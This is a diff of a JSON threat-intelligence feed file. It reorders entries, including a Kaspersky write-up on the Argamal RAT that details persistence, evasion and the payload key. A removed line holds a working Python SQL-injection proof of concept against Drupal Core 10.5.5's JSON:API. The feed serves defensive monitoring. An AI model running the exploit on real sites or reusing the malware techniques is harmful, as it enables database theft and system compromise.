     },
     {
+      "cluster_id": "f9c11bd945",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "threat_research"
+        ],
+        "confidence_tier": [
+          "tier_1_primary_research"
+        ]
+      },
+      "primary": {
+        "source": "Kaspersky Securelist",
+        "cohort": "threat_research_primary",
+        "title": "Argamal: Malware hidden in hentai games",
+        "link": "https://securelist.com/argamal-rat-distributed-with-hentai-games/119999/",
+        "published": "2026-06-03T09:00:22+00:00",
+        "summary": "Kaspersky researchers analyze new Argamal RAT distributed via infected hentai games and allowing the attacker to control the target machine.",
+        "full_body": "Table of Contents Technical details Background Delivery Script executor Malicious agent Other delivery methods Infrastructure Victims Attribution Conclusions Indicators of Compromise Authors Mikhail Reznichenko In April 2026, we discovered a new malware campaign targeting players of “hentai” games. Once launched, the infected games install a previously unknown malicious implant on the user’s machine. After a few days, the implant downloads and executes a Trojan, resulting in full system compromise and broad remote control capabilities for the attackers. We dubbed this malware family “Argamal”. The malware uses COM hijacking to persist on the victim’s machine, replacing the InprocServer32 entry for Windows Color System Calibration Loader DLL. This task is triggered when the user logs in, effectively allowing the malware to run at startup. Kaspersky solutions detect this threat as Trojan.Win32.Termixia.* , Trojan.Win32.Agent.* , HEUR:Trojan.Win32.Argamal.gen and HEUR:Trojan-Downloader.Win32.Argamal.gen . Technical details Background In April, as part of our ongoing monitoring of telemetry data, we found some suspicious DLLs. Further analysis revealed that various versions of these DLLs have existed since at least 2024. The DLLs were spawned by different games written using various game engines and programming languages, including RenPy (Python) and RPG Maker MV (JavaScript), among others. However, they all had one thing in common: they were all hentai games. We searched for the distribution sources and found a number of websites hosting game screenshots and download links. These links redirected users to PixelDrain, a free file transfer service. Adult games catalogue In addition to these websites, the trojanized games have also been distributed via different torrent trackers, including AniRena. Malicious game torrent in AniRena Delivery Both the dedicated websites and torrents delivered an archive containing the infected game. Contents of the game archive This archive contained fully functional, legitimate game files, as well as a modified FFmpeg DLL (SHA1: 42add9475e67a1ccc6a6af94b5475d3defc01b85 ), that imported the DllGetClassObject function from a file called natives2_blob.bin . Since the game needs ffmpeg.dll to run properly, the library loads as soon as the user starts the game. Script executor The natives2_blob.bin (SHA1: edce72f59e4c1d136cd1946af70d334c19df858d ) file is a DLL that executes a Base64-encoded PowerShell script when loaded. The natives2_blob.bin file code This PowerShell script, which we’ll call Stage1 , performs basic checks for controlled environments. For example, it checks for the Sandboxie folder in Program Files and Procmon64 in the process list. If all the checks indicate that the process is not running in a controlled environment, it proceeds to establish persistence. Stage1 sets the MI_V environment variable (and also MI_V2 in the new versions of malware) for the current user to another Base64-encoded PowerShell script, which we’ll call Stage2 . After that, it sets the InprocServer32 registry key at HKCU\\SOFTWARE\\Classes\\CLSID\\{722D0F89-B69C-4700-AE8C-4A44350E4876} to a random DLL file name in a random subdirectory of %USER%\\AppData\\Local , as well as the ShellFolder subkey to another random DLL file name in the same location. Stage1 also creates a scheduled task that will execute three days later. This task executes Stage2 and runs once. Stage2 is a payload downloader script. It takes previously generated DLL filenames from the registry and downloads an encrypted payload called zaesdl.dat from GitHub using bitsadmin.exe . The downloaded payload is saved in the settings.dat file in the randomly chosen subdirectory of %USER%\\AppData\\Local . Stage2 decrypts it using AES-CBC with the key zbcd1j9234r670eh and an IV equal to the key. The decrypted payload is then saved in the DLL file specified in the ShellFolder registry subkey. The decrypted payload is set as InprocServer32 at HKCU\\SOFTWARE\\Classes\\CL",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "threat_research",
+          "confidence_tier": "tier_1_primary_research",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Kaspersky Securelist",
+          "cohort": "threat_research_primary",
+          "title": "Argamal: Malware hidden in hentai games",
+          "link": "https://securelist.com/argamal-rat-distributed-with-hentai-games/119999/",
+          "published": "2026-06-03T09:00:22+00:00",
+          "summary": "Kaspersky researchers analyze new Argamal RAT distributed via infected hentai games and allowing the attacker to control the target machine.",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "threat_research",
+            "confidence_tier": "tier_1_primary_research",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "6a15521eed",
       "priority_score": 10,
       "member_count": 1,
@@ -5483,81 +5529,6 @@
                   0.3
                 ]
               ]
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "f9c11bd945",
-      "priority_score": 10,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "threat_research"
-        ],
-        "confidence_tier": [
-          "tier_1_primary_research"
-        ]
-      },
-      "primary": {
-        "source": "Kaspersky Securelist",
-        "cohort": "threat_research_primary",
-        "title": "Argamal: Malware hidden in hentai games",
-        "link": "https://securelist.com/argamal-rat-distributed-with-hentai-games/119999/",
-        "published": "2026-06-03T09:00:22+00:00",
-        "summary": "Kaspersky researchers analyze new Argamal RAT distributed via infected hentai games and allowing the attacker to control the target machine.",
-        "full_body": "Table of Contents Technical details Background Delivery Script executor Malicious agent Other delivery methods Infrastructure Victims Attribution Conclusions Indicators of Compromise Authors Mikhail Reznichenko In April 2026, we discovered a new malware campaign targeting players of “hentai” games. Once launched, the infected games install a previously unknown malicious implant on the user’s machine. After a few days, the implant downloads and executes a Trojan, resulting in full system compromise and broad remote control capabilities for the attackers. We dubbed this malware family “Argamal”. The malware uses COM hijacking to persist on the victim’s machine, replacing the InprocServer32 entry for Windows Color System Calibration Loader DLL. This task is triggered when the user logs in, effectively allowing the malware to run at startup. Kaspersky solutions detect this threat as Trojan.Win32.Termixia.* , Trojan.Win32.Agent.* , HEUR:Trojan.Win32.Argamal.gen and HEUR:Trojan-Downloader.Win32.Argamal.gen . Technical details Background In April, as part of our ongoing monitoring of telemetry data, we found some suspicious DLLs. Further analysis revealed that various versions of these DLLs have existed since at least 2024. The DLLs were spawned by different games written using various game engines and programming languages, including RenPy (Python) and RPG Maker MV (JavaScript), among others. However, they all had one thing in common: they were all hentai games. We searched for the distribution sources and found a number of websites hosting game screenshots and download links. These links redirected users to PixelDrain, a free file transfer service. Adult games catalogue In addition to these websites, the trojanized games have also been distributed via different torrent trackers, including AniRena. Malicious game torrent in AniRena Delivery Both the dedicated websites and torrents delivered an archive containing the infected game. Contents of the game archive This archive contained fully functional, legitimate game files, as well as a modified FFmpeg DLL (SHA1: 42add9475e67a1ccc6a6af94b5475d3defc01b85 ), that imported the DllGetClassObject function from a file called natives2_blob.bin . Since the game needs ffmpeg.dll to run properly, the library loads as soon as the user starts the game. Script executor The natives2_blob.bin (SHA1: edce72f59e4c1d136cd1946af70d334c19df858d ) file is a DLL that executes a Base64-encoded PowerShell script when loaded. The natives2_blob.bin file code This PowerShell script, which we’ll call Stage1 , performs basic checks for controlled environments. For example, it checks for the Sandboxie folder in Program Files and Procmon64 in the process list. If all the checks indicate that the process is not running in a controlled environment, it proceeds to establish persistence. Stage1 sets the MI_V environment variable (and also MI_V2 in the new versions of malware) for the current user to another Base64-encoded PowerShell script, which we’ll call Stage2 . After that, it sets the InprocServer32 registry key at HKCU\\SOFTWARE\\Classes\\CLSID\\{722D0F89-B69C-4700-AE8C-4A44350E4876} to a random DLL file name in a random subdirectory of %USER%\\AppData\\Local , as well as the ShellFolder subkey to another random DLL file name in the same location. Stage1 also creates a scheduled task that will execute three days later. This task executes Stage2 and runs once. Stage2 is a payload downloader script. It takes previously generated DLL filenames from the registry and downloads an encrypted payload called zaesdl.dat from GitHub using bitsadmin.exe . The downloaded payload is saved in the settings.dat file in the randomly chosen subdirectory of %USER%\\AppData\\Local . Stage2 decrypts it using AES-CBC with the key zbcd1j9234r670eh and an IV equal to the key. The decrypted payload is then saved in the DLL file specified in the ShellFolder registry subkey. The decrypted payload is set as InprocServer32 at HKCU\\SOFTWARE\\Classes\\CL",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "threat_research",
-          "confidence_tier": "tier_1_primary_research",
-          "role_map": {},
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Kaspersky Securelist",
-          "cohort": "threat_research_primary",
-          "title": "Argamal: Malware hidden in hentai games",
-          "link": "https://securelist.com/argamal-rat-distributed-with-hentai-games/119999/",
-          "published": "2026-06-03T09:00:22+00:00",
-          "summary": "Kaspersky researchers analyze new Argamal RAT distributed via infected hentai games and allowing the attacker to control the target machine.",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "threat_research",
-            "confidence_tier": "tier_1_primary_research",
-            "role_map": {},
-            "weak_tags": {
-              "products": []
             }
           }
         }
@@ -5948,9 +5919,7 @@
           "Drupal"
         ],
         "tools_used": [],
-        "cve_ids": [
-          "CVE-2026-9082"
-        ],
+        "cve_ids": [],
         "attack_techniques": [],
         "urgency_signals": [],
         "content_type": [
@@ -5967,8 +5936,8 @@
         "link": "https://www.exploit-db.com/exploits/52608",
         "published": "2026-06-01T00:00:00+00:00",
         "summary": "Drupal Core 10.5.5 - Error-Based SQL Injection",
-        "full_body": "Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training Drupal Core 10.5.5 - Error-Based SQL Injection EDB-ID: 52608 CVE: 2026-9082 EDB Verified: Author: cardosource Type: webapps Exploit: / Platform: PHP Date: 2026-06-01 Vulnerable App: # Exploit Title: Drupal Core 10.5.5 - Error-Based SQL Injection # Google Dork: N/A # Date: 2026-05-31 # Exploit Author: cardosource # Vendor Homepage: https://www.drupal.org # Software Link: https://www.drupal.org/project/drupal # Version: Drupal Core 10.5.5 # Tested on: Debian Linux (Docker), PHP 8.2, Apache, PostgreSQL 17 # CVE: CVE-2026-9082 # # Description: # This proof-of-concept demonstrates an Error-Based SQL Injection in # Drupal Core 10.5.5 (PostgreSQL). User-controlled JSON:API filter # array keys influence SQL query construction, allowing database # information disclosure through SQL error messages. import requests import json from urllib.parse import urlencode TARGET_URL = \"http://localhost:8080/jsonapi/node/article\" BANNER = \"\"\" [+] Drupal Core 10.5.5 - Error-Based SQL Injection [+] CVE-2026-9082 [+] Target: JSON:API (PostgreSQL) \"\"\" def extract_data(subquery): headers = { \"Accept\": \"application/vnd.api+json\", \"Content-Type\": \"application/vnd.api+json\" } payload = f\"0||CAST(({subquery}) AS INTEGER)\" params = { \"filter[my_filter][condition][path]\": \"title\", \"filter[my_filter][condition][operator]\": \"IN\", \"filter[my_filter][condition][value][0]\": \"Example\", f\"filter[my_filter][condition][value][{payload}]\": \"Injection\" } try: response = requests.get(TARGET_URL, headers=headers, params=params, timeout=10) if response.status_code == 500: try: error = response.json().get(\"errors\", [{}])[0].get(\"detail\", \"\") if \"invalid input syntax\" in error: data = error.split('\"')[1] if '\"' in error else error print(f\"\\033[92m[SUCCESS]\\033[0m {data}\") except json.JSONDecodeError: pass except requests.exceptions.RequestException: pass if __name__ == \"__main__\": print(BANNER) extract_data(\"SELECT version()\") Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber Range Proving Grounds Penetration Testing Services",
-        "fetch_status": "ok",
+        "full_body": "",
+        "fetch_status": "fetch_failed:HTTPError",
         "taxonomy": {
           "threat_categories": [],
           "actor_attribution": [],
@@ -5977,9 +5946,7 @@
             "Drupal"
           ],
           "tools_used": [],
-          "cve_ids": [
-            "CVE-2026-9082"
-          ],
+          "cve_ids": [],
           "attack_techniques": [],
           "urgency_signals": [],
           "content_type": "news_report",
@@ -6008,9 +5975,7 @@
               "Drupal"
             ],
             "tools_used": [],
-            "cve_ids": [
-              "CVE-2026-9082"
-            ],
+            "cve_ids": [],
             "attack_techniques": [],
             "urgency_signals": [],
             "content_type": "news_report",
@@ -6058,7 +6023,7 @@
         "title": "Why Holistic Sourcing Wins: The Numbers Behind the Recorded Future Advantage",
         "link": "https://www.recordedfuture.com/blog/recorded-future-holistic-sourcing-wins",
         "published": "2026-06-05T00:00:00+00:00",
-        "summary": "Future’s Intelligence Grap® uses holistic sourcing across 1M+ sources for complete threat intelligence and proactive defense.",
+        "summary": "Recorded Future’s Intelligence Graph® uses holistic sourcing across 1M+ sources for complete threat intelligence and proactive defense.",
         "full_body": "Why Holistic Sourcing Wins: The Numbers Behind the Recorded Future Advantage Threats don't operate in silos, and neither should your intelligence. This post, the first in a three-part series, breaks down why comprehensive sourcing is the foundation of effective threat intelligence -- and how Recorded Future's Intelligence Graph® monitors over one million sources across technical, criminal, collective, and open-source domains to surface what narrow or siloed solutions miss. From nation-state TTPs to criminal infrastructure to credential leaks, complete coverage is what separates awareness from action. Part 1 of 3: Built Different — How Recorded Future's Unique Sourcing Enables Comprehensive Intelligence Threats don't manifest from a single place or operate in silos. Your intelligence shouldn’t, either. When you’re evaluating threat intelligence providers, visibility at speed matters most. Many providers focus exclusively on narrow collection areas, like dark web activity or malware. Others are rich with data on incidents that have already taken place rather than the early signals of threat infrastructure that enable preventative action. They've built deep expertise in a narrow lane—dark web collection, malware analysis, vulnerability feeds—and they're good at it. But specialization has limitations in reducing risk. Attackers don't stay in their lane. They pivot across infrastructure, blend nation-state TTPs with criminal tooling, and exploit the seams between what your tools can see and what they can’t. The gaps in your intelligence coverage are exactly where they operate. At Recorded Future, we’ve built the industry’s most complete intelligence capability, collecting and analyzing data from over one million sources across technical, open, and underground environments. This breadth isn’t just about scale. It’s about seeing what others miss—and acting on it. The limits of partial visibility Many threats can only be revealed through patterns across massive datasets —patterns that simply don’t exist in smaller or siloed collections. Malicious infrastructure and threat signals are often only available from disparate sources, so you need a multi-faceted collection apparatus to detect campaigns early enough to stop them. Consider this: A security team believed they had full visibility into outbound traffic during an investigation. But Recorded Future’s Network Intelligence surfaced suspicious activity on a specific port. That signal led to deeper investigation—revealing additional command-and-control communication that had gone undetected due to incomplete logging. Without large-scale telemetry and correlation, part of the intrusion would have remained invisible. This is the difference between data and intelligence. How Recorded Future sources: four domains, one picture Threats don't originate from one place, and neither should your intelligence. Adversaries move across malware infrastructure, underground marketplaces, phishing campaigns, credential leaks, and vulnerability exploitation, often leaving little evidence behind at each step. Catching them requires complete coverage. That’s why Recorded Future integrates intelligence across four domains: Technical : Internet-scale telemetry, including malware analysis Criminal : Underground and ransomware sources Collective : Customer-contributed intelligence (Collective Insights®) Open-source (OSINT) : Malicious sites, code repositories, and social media This unified approach enables organizations to track threats across their full lifecycle—from reconnaissance to exploitation. Comprehensive intelligence — from awareness to action When you’re evaluating threat intelligence vendors, it’s important to look at the scale and quality of their sourcing. While many security solutions excel in specific areas, comprehensive threat intelligence requires looking from every vantage point. Some might offer endpoint detection and dark web monitoring, but have no visibility into supply chain attacks. O",
         "fetch_status": "ok",
         "taxonomy": {
@@ -6090,7 +6055,7 @@
           "title": "Why Holistic Sourcing Wins: The Numbers Behind the Recorded Future Advantage",
           "link": "https://www.recordedfuture.com/blog/recorded-future-holistic-sourcing-wins",
           "published": "2026-06-05T00:00:00+00:00",
-          "summary": "Future’s Intelligence Grap® uses holistic sourcing across 1M+ sources for complete threat intelligence and proactive defense.",
+          "summary": "Recorded Future’s Intelligence Graph® uses holistic sourcing across 1M+ sources for complete threat intelligence and proactive defense.",
           "taxonomy": {
             "threat_categories": [
               "ransomware_extortion",
@@ -8348,6 +8313,81 @@
       ]
     },
     {
+      "cluster_id": "8f36ac3451",
+      "priority_score": 8,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "vulnerability_disclosure"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "Infosecurity Magazine",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "Infosecurity Europe: Vulnerability Management Innovator Konvu Wins Cyber Startup Award",
+        "link": "https://www.infosecurity-magazine.com/news/konvu-wins-cyber-startup-award/",
+        "published": "2026-06-03T13:30:00+00:00",
+        "summary": "Inaugural Infosecurity Europe Cyber Startup Award Winner Impresses Panel with Ability Help Prioritize Vulnerabilities in AI era",
+        "full_body": "",
+        "fetch_status": "not_attempted",
+        "taxonomy": {
+          "threat_categories": [],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "vulnerability_disclosure",
+          "confidence_tier": "tier_4_news",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Infosecurity Magazine",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Infosecurity Europe: Vulnerability Management Innovator Konvu Wins Cyber Startup Award",
+          "link": "https://www.infosecurity-magazine.com/news/konvu-wins-cyber-startup-award/",
+          "published": "2026-06-03T13:30:00+00:00",
+          "summary": "Inaugural Infosecurity Europe Cyber Startup Award Winner Impresses Panel with Ability Help Prioritize Vulnerabilities in AI era",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "vulnerability_disclosure",
+            "confidence_tier": "tier_4_news",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "ac3891b02c",
       "priority_score": 8,
       "member_count": 1,
@@ -8508,81 +8548,6 @@
             "threat_categories": [
               "active_exploitation"
             ],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "vulnerability_disclosure",
-            "confidence_tier": "tier_4_news",
-            "role_map": {},
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "8f36ac3451",
-      "priority_score": 8,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "vulnerability_disclosure"
-        ],
-        "confidence_tier": [
-          "tier_4_news"
-        ]
-      },
-      "primary": {
-        "source": "Infosecurity Magazine",
-        "cohort": "cyber_news_breach_reporting",
-        "title": "Infosecurity Europe: Vulnerability Management Innovator Konvu Wins Cyber Startup Award",
-        "link": "https://www.infosecurity-magazine.com/news/konvu-wins-cyber-startup-award/",
-        "published": "2026-06-03T13:30:00+00:00",
-        "summary": "Inaugural Infosecurity Europe Cyber Startup Award Winner Impresses Panel with Ability Help Prioritize Vulnerabilities in AI era",
-        "full_body": "",
-        "fetch_status": "not_attempted",
-        "taxonomy": {
-          "threat_categories": [],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "vulnerability_disclosure",
-          "confidence_tier": "tier_4_news",
-          "role_map": {},
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Infosecurity Magazine",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "Infosecurity Europe: Vulnerability Management Innovator Konvu Wins Cyber Startup Award",
-          "link": "https://www.infosecurity-magazine.com/news/konvu-wins-cyber-startup-award/",
-          "published": "2026-06-03T13:30:00+00:00",
-          "summary": "Inaugural Infosecurity Europe Cyber Startup Award Winner Impresses Panel with Ability Help Prioritize Vulnerabilities in AI era",
-          "taxonomy": {
-            "threat_categories": [],
             "actor_attribution": [],
             "affected_industries": [],
             "affected_products": [],
@@ -8828,7 +8793,7 @@
         ]
       },
       "cluster_count": 11,
-      "article_count": 19,
+      "article_count": 18,
       "cohesion": 0.246,
       "shared_strong_signals": [
         "Palo Alto Networks"
@@ -8841,8 +8806,8 @@
       "cluster_ids": [
         "df6874157e",
         "791da8c978",
-        "5c65105996",
         "001d61d9b2",
+        "5c65105996",
         "a8a021acdc",
         "9aa815a49a",
         "4faddc63ad",
@@ -8860,10 +8825,9 @@
         "https://risky.biz/RBNEWS571/",
         "https://cyberscoop.com/palo-alto-networks-cve-2026-0257-exploited-vulnerability/",
         "https://thehackernews.com/2026/06/cisa-adds-exploited-magento-rce-flaw.html",
+        "https://horizon3.ai/attack-research/vulnerabilities/cve-2026-44825/",
         "https://thehackernews.com/2026/06/cisa-adds-actively-exploited-solarwinds.html",
         "https://www.bleepingcomputer.com/news/security/cisa-hackers-now-exploit-solarwinds-serv-u-flaw-to-crash-servers/",
-        "https://www.reddit.com/r/cybersecurity/comments/1tye11l/cisa_hackers_now_exploit_solarwinds_servu_flaw_to/",
-        "https://horizon3.ai/attack-research/vulnerabilities/cve-2026-44825/",
         "https://thehackernews.com/2026/06/google-june-2026-android-update-patches.html",
         "https://thehackernews.com/2026/06/unpatched-windows-search-uri.html",
         "https://thehackernews.com/2026/06/cisco-patches-cve-2026-20230-in-unified.html",
@@ -9417,19 +9381,6 @@
     ],
     "persistence": [],
     "tier_inversion": [
-      {
-        "cluster_id": "5c65105996",
-        "title": "CISA Adds Actively Exploited SolarWinds Serv-U DoS Flaw to KEV Catalog",
-        "primary_source": "The Hacker News",
-        "strong_signals": [
-          "CVE-2024-21182",
-          "CVE-2026-0257",
-          "CVE-2026-28318",
-          "CVE-2026-39987",
-          "CVE-2026-45659",
-          "Cl0p"
-        ]
-      },
       {
         "cluster_id": "a5c944a483",
         "title": "CVE-2026-46640: Developing payloads for Twig sandbox bypass",
